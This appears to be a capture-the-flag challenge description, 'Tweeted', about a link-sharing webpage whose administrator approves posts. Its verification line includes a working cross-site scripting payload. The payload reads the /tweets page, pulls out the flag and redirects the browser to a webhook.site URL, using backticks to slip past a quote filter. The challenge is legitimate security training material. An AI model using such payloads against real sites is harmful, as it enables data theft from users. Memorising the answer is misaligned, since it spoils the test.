- title: Tweeted
- description: I am building a small webpage to share interesting links with everyone. Last night we had some complaints about hackers, so I've put the app in lockdown mode and I am personally approving every new post. Can you figure out what happened?
- flag: see docker-compose.yml
- time to solve: ~30 minutes
- verifying challenge: example malicious url: "console.log(jQuery.get(`/tweets`,function(response){window.location=`https://webhook.site/0da86b21-132d-474f-a9e7-fed4c28cbb06?`+response.match(/CSCBE{.*}/)[0]}))" (backticks instead of usual quotes to avoid the filter). Use your own webhook.site instance.
- The source code of the `tweets` package is intended to be public.